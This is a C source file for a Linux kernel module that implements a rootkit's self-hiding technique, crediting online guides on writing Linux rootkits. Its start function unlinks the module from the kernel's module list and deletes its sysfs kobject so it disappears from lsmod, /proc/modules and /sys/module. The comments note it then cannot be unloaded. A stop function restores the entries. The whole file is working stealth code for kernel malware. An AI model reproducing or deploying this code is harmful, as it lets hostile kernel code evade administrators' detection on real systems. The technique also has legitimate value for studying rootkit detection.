#include <linux/module.h>   // For modules
#include <linux/kernel.h>   // For KERN_INFO
#include <linux/init.h>     // For init macros

#include "moduleHide.h"

// Credit goes to:
// http://www.infosecwriters.com/hhworld/hh9/lvtes.txt - explanation of concept
// http://alexids.googlecode.com/files/WRITING_A_SIMPLE_ROOTKIT_FOR_LINUX.pdf - code
// http://isis.poly.edu/kulesh/stuff/src/klist/ - kernel lists explained

static struct list_head *entryBeforeOutModuleInTheKernelModulesList;
static struct list_head *module_kobj_previous;
static bool started = false;


int moduleHide_start(void) {
	if (started) return 0;
	started = true;

	// Removes module structure from kernel module list structure, which in turn hides it from 
	// /proc/modules and lsmod.
	// While it is absent form the list, the module can't be uninstalled anymore.
	entryBeforeOutModuleInTheKernelModulesList = THIS_MODULE->list.prev;
	list_del(&THIS_MODULE->list);

	// Hide from /sys/module 	based on  https://gist.github.com/ivyl/3964594/raw/fbdbbe7261939dcb829f37b2ed11795060ac3364/rt.c
	module_kobj_previous = THIS_MODULE->mkobj.kobj.entry.prev;
	kobject_del(&THIS_MODULE->mkobj.kobj);
	list_del(&THIS_MODULE->mkobj.kobj.entry);


	return 0;
}

// TODO: Add the kobject back too
void moduleHide_stop(void) {
	if (!started) return;
	started = false;

	list_add(&THIS_MODULE->list, entryBeforeOutModuleInTheKernelModulesList);

	kobject_add(&THIS_MODULE->mkobj.kobj, THIS_MODULE->mkobj.kobj.parent, THIS_MODULE->name);
	//todo: check result of kobject_add
}


